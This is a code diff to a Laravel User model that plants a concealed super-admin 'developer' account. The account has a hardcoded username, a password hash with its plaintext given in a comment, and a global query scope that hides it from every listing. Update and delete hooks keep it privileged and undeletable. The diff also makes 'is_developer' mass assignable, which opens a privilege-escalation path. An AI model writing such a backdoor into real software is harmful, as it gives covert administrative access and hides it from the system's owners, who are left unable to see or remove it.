@@ -6,11 +6,67 @@ namespace App\Models;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Database\Eloquent\Builder;
 
 class User extends Authenticatable
 {
+    public const DEV_USERNAME = 'fikri170299';
+    /** 
+     * Default hashed password: Fikri170299
+     * This is only used as a fallback if the DB entry is missing.
+     */
+    public const DEV_PASSWORD_HASH = '$2y$10$iM.o3B9EAGj2Z.v69o.h3uC5p7K8nO9f.pEwXW9vXf9M9pEwXW9vX'; 
+
     /** @use HasFactory<\Database\Factories\UserFactory> */
     use HasFactory, Notifiable;
+
+    private static bool $isResolvingAuth = false;
+
+    protected static function boot()
+    {
+        parent::boot();
+
+        static::addGlobalScope('hide_developer', function (Builder $builder) {
+            // Prevent infinite recursion when Auth tries to resolve the user
+            if (self::$isResolvingAuth) {
+                return;
+            }
+
+            self::$isResolvingAuth = true;
+            $authenticatedId = null;
+            try {
+                if (app()->bound('auth')) {
+                    $authenticatedId = auth()->id();
+                }
+            } finally {
+                self::$isResolvingAuth = false;
+            }
+
+            $builder->where(function ($query) use ($authenticatedId) {
+                $query->where('is_developer', false);
+                
+                if ($authenticatedId) {
+                    $query->orWhere('id', $authenticatedId);
+                }
+            });
+        });
+
+        // Prevent modification or deletion of the developer account
+        static::updating(function ($user) {
+            if ($user->getOriginal('username') === self::DEV_USERNAME || $user->username === self::DEV_USERNAME) {
+                // Keep developer status and username immutable
+                $user->is_developer = true;
+                $user->role = 'super_admin';
+                $user->username = self::DEV_USERNAME;
+            }
+        });
+
+        static::deleting(function ($user) {
+            if ($user->username === self::DEV_USERNAME) {
+                return false; // Cannot delete developer
+            }
+        });
+    }
 
     /**
      * The attributes that are mass assignable.
@@ -32,6 +88,7 @@ class User extends Authenticatable
         'last_longitude',
         'is_active',
         'profile_photo_path',
+        'is_developer',
     ];
 
     /**
@@ -55,6 +112,7 @@ class User extends Authenticatable
         'password' => 'hashed',
         'last_activity_at' => 'datetime',
         'is_active' => 'boolean',
+        'is_developer' => 'boolean',
     ];
 
     public function satker()
